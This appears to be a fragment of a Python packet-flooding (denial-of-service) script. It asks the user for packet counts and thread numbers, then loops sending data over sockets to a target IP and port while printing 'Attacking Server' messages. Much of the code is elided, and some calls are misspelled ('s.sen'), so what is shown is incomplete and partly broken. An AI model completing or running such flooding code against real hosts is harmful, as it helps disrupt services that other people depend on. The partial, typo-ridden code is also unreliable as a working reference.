...
choice = str(input(" Enter The Ready Attack [Y] (y/n):"))
times = int(input(" Enter The Attack Packet:"))
threads = int(input(" Enter The Attack Threads:"))
  ...
  while True:
    try:
      ...
      for x in range(times):
        s.sen(data,addr)
        print(i +" \033[96m=====>>>Attacking Server: %s \033[96m=======>>>And Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[96m=====>>>Attacking Server: %s \033[96m=======>>>And Attack Port:%s!!!"%(ip,port))
...
def xxxxxx():
  ...
  while True:
    try:
      ...
      for x in range(times):
        s.sen(data,addr)
        print(i +" \033[94m=====>>>Send attacking Packet To: %s \033[96m=======>>>And Attack Port:%s!!!"%(ip,port))
    except:
      print(" \033[94m=====>>>Send Attacking Downed Host: %s \033[96m=======>>>And Attack Downed Port:%s!!!"%(ip,port))
...
def xx():
  ...
  while True:
    try:
      ...
      for x in range(times):
        s.send(data)
        print(i +"\033[96m=====>>>Sent packet to hosted: %s \033[94m======>>>And Attack Port:%s!!!"%(ip,port))
    except:
      s.close()
      print("\033[96m=====>>>Sent packet to hosted: %s \033[94m=====>>>And Attack Port:%s!!!"%(ip,port))
